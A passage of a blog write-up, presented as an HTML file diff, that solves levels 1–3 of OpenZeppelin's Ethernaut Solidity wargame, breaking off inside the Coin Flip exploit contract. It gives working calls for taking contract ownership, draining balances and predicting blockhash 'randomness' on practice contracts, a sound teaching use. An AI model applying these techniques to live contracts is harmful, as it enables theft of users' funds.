@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        Demystifying Solidity Wargames: Openzeppelin&#39;s ethernaut ::
+        AHZ
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="LEVELS ONGOING#LEVEL 1: Fallback#Objective:#Claim the ownership of the contract. Reduce it&amp;rsquo;s balance to 0. Demystifying Contract:#The contract is constructed based on different functions and methods, The first two lines are defining a map and an address:
+mapping(address =&amp;gt; uint) public contributions; address public owner; The first line is a map defined as &amp;ldquo;contributions&amp;rdquo; that assigns every address to the amount that it contributes, and the second line is the owner&amp;rsquo;s address that gets initiated later in the constructor."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/post/demystifying-solidity-wargames-openzeppelins-ethernaut/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Demystifying Solidity Wargames: Openzeppelin&#39;s ethernaut"/>
+<meta name="twitter:description" content="In this write-up, I will demystify how to conquer the Openzeppelin&#39;s ethernaut wargame."/>
+
+
+
+<meta property="og:title" content="Demystifying Solidity Wargames: Openzeppelin&#39;s ethernaut" />
+<meta property="og:description" content="In this write-up, I will demystify how to conquer the Openzeppelin&#39;s ethernaut wargame." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/demystifying-solidity-wargames-openzeppelins-ethernaut/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-06-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-06-09T00:00:00+00:00" /><meta property="og:site_name" content="AHZ" />
+
+
+
+
+
+
+  </head>
+  <body class="light-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+
+    <span class="logo__text"
+      >AHZ</span
+    >
+
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/files/cv.pdf">About</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/files/cv.pdf">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">Demystifying Solidity Wargames: Openzeppelin&rsquo;s ethernaut</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          2021-06-09
+        </time>
+
+        
+          
+        
+      
+
+      
+
+      
+        
+          <span class="post-read-time"
+            >— 22 min read</span
+          >
+        
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="/tags/openzeppelin/">#Openzeppelin</a>&nbsp;
+        
+          <a href="/tags/solidity/">#Solidity</a>&nbsp;
+        
+          <a href="/tags/wargame/">#Wargame</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+  
+    <img src="/img/Demystifying-solidity-wargames-openzeppelin-ethernaut/cover.jpg" alt="Demystifying Solidity Wargames: Openzeppelin&#39;s ethernaut"/>
+  
+
+  
+</figure>
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="levels-ongoing">
+  LEVELS ONGOING
+  <a href="#levels-ongoing" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<h2 id="level-1-fallback">
+  LEVEL 1: Fallback
+  <a href="#level-1-fallback" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective">
+  Objective:
+  <a href="#objective" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Claim the ownership of the contract.</li>
+<li>Reduce it&rsquo;s balance to 0.</li>
+</ul>
+<h3 id="demystifying-contract">
+  Demystifying Contract:
+  <a href="#demystifying-contract" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on different functions and methods, The first two lines are defining a map and an address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">mapping</span>(<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">uint</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">contributions</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
+</span></span></code></pre></div><p>The first line is a map defined as &ldquo;contributions&rdquo; that assigns every address to the amount that it contributes, and the second line is the owner&rsquo;s address that gets initiated later in the constructor.</p>
+<p>The constructor is a method that initialize the state variables of the contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">contributions</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1000</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The first line of the constructor initialize the owner&rsquo;s address while the second initialize the owner&rsquo;s contribution.</p>
+<p>The modifier serves the purpose of making sure that the caller is only and only the owner:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">owner</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The contribute function is a payable method which means it can receive value:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">contribute</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.001</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">contributions</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">+=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">contributions</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">contributions</span>[<span style="color:#a6e22e">owner</span>]) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The contribute method requires the value you send to the contract to be less than 0.001 ether, and if your address contribution is bigger than the owner&rsquo;s contribution then your address will be the new owner.</p>
+<p>The withdraw method is used to transfer all the balance to the owner:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">onlyOwner</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">payable</span>(<span style="color:#a6e22e">owner</span>).<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The receive method is a fallback method which means it can be called by doing a transfer to the contract with an empty data field:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">contributions</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The receive method sets your address as the owner if your address contribution value is more than 0 and your address transfer value to the contract while calling the fallback function is more than 0.</p>
+<h3 id="demystifying-solution">
+  Demystifying Solution:
+  <a href="#demystifying-solution" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>First you&rsquo;ve to call the contribute() function so your address is satisfying the fallback funtion requirement of more than 0 contribution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">contribute</span>({<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span><span style="color:#a6e22e">toWei</span>(<span style="color:#ae81ff">0.001</span>)})
+</span></span></code></pre></div><p>By making a transfer to the contract with an empty data field your address will call the receive() fallback function which will set your address as the owner of the contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">sendTransaction</span>({ <span style="color:#a6e22e">from</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">player</span>, <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span> })
+</span></span></code></pre></div><p>And by withdrawing the funds you&rsquo;ll have the full solution for your instance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">withdraw</span>()
+</span></span></code></pre></div><p>You can check the balance of the contract by calling:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">address</span>)
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-2-fallout">
+  LEVEL 2: Fallout
+  <a href="#level-2-fallout" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-1">
+  Objective:
+  <a href="#objective-1" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Claim the ownership of the contract.</li>
+</ul>
+<h3 id="demystifying-contract-1">
+  Demystifying Contract:
+  <a href="#demystifying-contract-1" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on different functions and methods, The first two lines are defining a map and an address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">mapping</span>(<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">allocations</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">owner</span>;
+</span></span></code></pre></div><p>The first line is a map defined as &ldquo;allocations&rdquo; that assigns every address to the amount that it allocates, and the second line is the owner&rsquo;s address.</p>
+<p>The Fal1out() method is meant to be the constructor of the contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Fal1out</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">owner</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">allocations</span>[<span style="color:#a6e22e">owner</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>But due to the typo in &ldquo;Fal1&rdquo; instead of &ldquo;Fall&rdquo;, Now it&rsquo;s a normal function that can be called by anyone.</p>
+<p>The modifier serves the purpose of making sure that the caller is only and only the owner:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">owner</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The allocate() method is a payable function that add the value you transfer to the contract while calling the function to your allocations:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocate</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">allocations</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">allocations</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>].<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The sendAllocation() method allows address&rsquo;s to transfer value to each other:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendAllocation</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">allocator</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">allocations</span>[<span style="color:#a6e22e">allocator</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">allocator</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">allocations</span>[<span style="color:#a6e22e">allocator</span>]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>With the security requirement of bigger than 0 allocations for the sender address.</p>
+<p>The collectAllocations() method allows only the owner&rsquo;s address - due to the onlyOwner modifier - to withdraw allocations:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">collectAllocations</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">onlyOwner</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">transfer</span>(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>).<span style="color:#a6e22e">balance</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The allocatorBalance() allows address&rsquo;s to check their allocations balance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocatorBalance</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">allocator</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">allocations</span>[<span style="color:#a6e22e">allocator</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-1">
+  Demystifying Solution:
+  <a href="#demystifying-solution-1" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Due to the wrong implementation of the constructor due to the typo in the name of the constructor, You can directly call the Fal1out() method and become the owner of the contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">Fal1out</span>()
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-3-coin-flip">
+  LEVEL 3: Coin Flip
+  <a href="#level-3-coin-flip" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-2">
+  Objective:
+  <a href="#objective-2" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Guess the outcome of the coin flip 10 times in a row.</li>
+</ul>
+<h3 id="demystifying-contract-2">
+  Demystifying Contract:
+  <a href="#demystifying-contract-2" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a constructor and a function, The first three lines are defining three variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">consecutiveWins</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">lastHash</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">FACTOR</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span></code></pre></div><p>The first line is the number of winnings in a row, The second line is the last hash defined and the third line is the factor used to determine the coinFlip variable.</p>
+<p>The constructor initialize the number of winnings in a row to zero:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">consecutiveWins</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The flip method is a multilevel function that validates the guess and confirm the win in the consecutiveWins variable.</p>
+<p>The blockValue variable assigns the flip outcome through the previous blockhash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint256</span>(<span style="color:#a6e22e">blockhash</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>));
+</span></span></code></pre></div><p>The first if statement validates blockValue which is the previous blockhash not equal to the last hash used in the flip() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">lastHash</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">blockValue</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">revert</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which prevent us from validating already determined answer by the contract.</p>
+<p>The blockValue is now assigned to the last hash after validating the inequality:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">lastHash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">blockValue</span> <span style="color:#f92672">/</span> <span style="color:#a6e22e">FACTOR</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">side</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">coinFlip</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">true</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>;
+</span></span></code></pre></div><p>The coinFlip variable is detetmined by the blockValue divided by the factor, The boolean side variable is a conditional (ternary) operator that assign&rsquo;s true if the coinFlip is 1 and false otherwise.</p>
+<p>The last if statement validates the guess equal to the side variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">side</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">_guess</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">consecutiveWins</span><span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">consecutiveWins</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which if true confirms the win by incrementing the consecutiveWins variable, Otherwise the consecutiveWins variable will be reset to 0.</p>
+<h3 id="demystifying-solution-2">
+  Demystifying Solution:
+  <a href="#demystifying-solution-2" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The blockValue variable is deterministic which means it can&rsquo;t be a source for randomness and therefore can be determined for different contracts as the same variable.</p>
+<p>The solution contract sets an interface for the CoinFlip&rsquo;s contract flip() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">ICoinFlip</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flip</span>(<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">_guess</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Which allow us to call the flip method directly from the solution contract.</p>
+<p>The solution contract is constructed based on a function and a constructor, The first two lines are defining two variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">ICoinFlip</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">instance</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">FACTOR</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">57896044618658097711785492504343953926634992332820282019728792003956564819968</span>;
+</span></span></code></pre></div><p>The first line is the instance for the CoinFlip contract interface, The second line is the factor used to determine the coinFlip variable.</p>
+<p>The constructor initialize the instance address for the CoinFlip contract interface:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">instanceAddress</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ICoinFlip</span>(<span style="color:#a6e22e">instanceAddress</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method simulate the flip() method functionality while simultaneously calling the instance flip() method with the true side answer:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>
